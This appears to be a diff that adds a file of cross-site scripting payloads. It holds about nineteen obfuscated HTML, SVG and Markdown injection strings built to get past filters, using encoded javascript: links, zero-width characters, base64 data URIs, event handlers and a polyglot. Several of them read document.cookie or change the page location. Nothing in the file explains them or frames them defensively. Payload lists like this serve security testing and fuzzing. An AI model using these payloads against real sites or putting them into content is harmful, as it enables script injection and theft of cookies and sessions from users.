@@ -1,0 +1,19 @@
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+[a](javascript​:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74​&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+![a'"`onerror=prompt(document.cookie)](x)
+[notmalicious](javascript​:window.onerror=alert;throw%20document.cookie)
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+<​style>@keyframes a{}b{animation:a;}<​/style><b/onanimationstart​=prompt`${document.domain}&#x60;>
+1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
+<svg><set onbegin​=d=document,b='`',d['loca'+'tion']='javascript​&colon;aler'+'t'+b+domain+b>
+<Svg%K9OnLoad=%7Krompt%6K1%6K>
+javascript%3A%2F%2F%250Aalert%281%29
+javascript%3A%2561lert%281%29 javascript%3A%7B+alert%600%60+%7D
+<%2Fstyle><%2Fscript><​script>alert%28"XSS"%29<%2Fscript>
+%5Cx6A%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%5Cx3aalert%281%29
+<img/src/onerror​=arguments[0].path.pop().['al'+'ert'](1)>
+ JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
